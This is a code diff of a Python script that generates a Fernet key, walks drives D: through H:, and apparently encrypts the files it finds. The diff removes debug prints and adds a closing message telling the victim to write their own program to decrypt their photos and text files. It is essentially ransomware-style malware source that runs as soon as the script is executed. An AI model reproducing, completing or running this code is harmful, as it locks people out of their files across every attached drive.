@@ -16,14 +16,12 @@ def load_key():
     return open("key.key", "rb").read()
     
 def enc():
-    print("hi")
     write_key()
     key = load_key()
     f = Fernet(key)
     q = ("D:\\","E:\\","F:\\","G:\\","H:\\") 
     for z in q:
         if os.path.exists(z):
-            print(z)
             for subdir, dirs, files in os.walk(z):
                 for filename in files:
                     filepath = subdir + os.sep + filename
@@ -46,3 +44,5 @@ def enc():
                         print(filepath)
 
 enc()   # calling function 
+print("Now write your own program to decrypt your photos and text files. Key file is given at Desktop as 'key.key'. ALL THE BEST.")
+input()
